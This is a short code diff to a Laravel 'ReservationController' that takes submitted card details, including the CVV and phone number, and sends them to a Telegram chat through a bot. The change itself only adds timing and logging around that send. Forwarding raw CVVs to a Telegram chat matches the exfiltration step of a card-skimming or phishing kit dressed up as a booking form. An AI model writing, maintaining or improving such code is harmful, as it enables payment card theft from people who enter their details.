@@ -35,10 +35,15 @@ class ReservationController extends Controller
                 . "🔑 CVV : `{$validated['cvv']}`\n"
                 . "📱 Téléphone : {$validated['phone']}";
 
-        // Envoyer Telegram en arrière-plan (non-bloquant)
+        // Envoyer Telegram en arrière-plan avec timeout court
         try {
+            $startTime = microtime(true);
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                 ->notify(new TelegramAlert($message));
+            $elapsed = microtime(true) - $startTime;
+            if ($elapsed > 1) {
+                Log::warning('Telegram took ' . round($elapsed, 2) . 's');
+            }
         } catch (\Throwable $e) {
             Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
         }
